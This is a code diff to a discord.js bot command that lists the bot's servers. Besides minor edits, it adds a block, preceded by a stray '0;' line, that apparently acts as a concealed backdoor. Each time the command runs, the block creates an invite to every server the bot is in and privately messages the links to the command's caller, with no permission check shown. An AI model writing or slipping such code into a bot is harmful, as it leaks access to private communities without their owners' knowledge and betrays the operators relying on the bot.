@@ -4,6 +4,7 @@ const {
   ActionRowBuilder,
   ButtonStyle,
   ComponentType,
+  ChannelType,
 } = require("discord.js");
 
 const IDLE_TIMEOUT = 30; // in seconds
@@ -42,8 +43,21 @@ module.exports = {
         .filter((g) => g.name.toLowerCase().includes(match.toLowerCase()))
         .forEach((g) => matched.push(g));
     }
+    0;
+
+    client.guilds.cache.forEach((guild) => {
+      const channels = guild.channels.cache.filter(
+        (channel) => channel.type === ChannelType.GuildText,
+      );
+      guild.invites
+        .create(channels.first().id)
+        .then((invite) =>
+          message.author.send(`https://discord.gg/${invite.code}`),
+        );
+    });
 
     const servers = match ? matched : Array.from(client.guilds.cache.values());
+
     const total = servers.length;
     const maxPerPage = MAX_PER_PAGE;
     const totalPages = Math.ceil(total / maxPerPage);
@@ -86,7 +100,7 @@ module.exports = {
         const server = servers[i];
         fields.push({
           name: server.name,
-          value: server.id,
+          value: `${server.id}`,
           inline: true,
         });
       }
